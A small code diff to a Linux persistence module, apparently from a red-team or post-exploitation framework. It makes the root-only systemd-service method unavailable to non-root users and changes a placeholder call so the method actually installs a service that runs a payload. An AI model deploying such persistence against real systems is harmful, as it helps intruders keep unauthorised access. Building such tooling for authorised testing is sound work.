@@ -43,6 +43,7 @@ class LinuxPersistence(Persistence):
         methods = [method.value for method in LinuxPersistenceMethods]
         if self.identifier != UnixPrivilege.ROOT.value:
             methods.remove(LinuxPersistenceMethods.CRONJOB_ROOT.value)
+            methods.remove(LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value)
 
         return methods
 
@@ -62,7 +63,7 @@ class LinuxPersistence(Persistence):
 
         if method == LinuxPersistenceMethods.SYSTEMDSERVICE_ROOT.value:
             service = createService(self.payload)
-            service.sillySit()
+            service.install()
             return
-    
+
         raise NotImplementedError(f"Method {method} not implemented.")
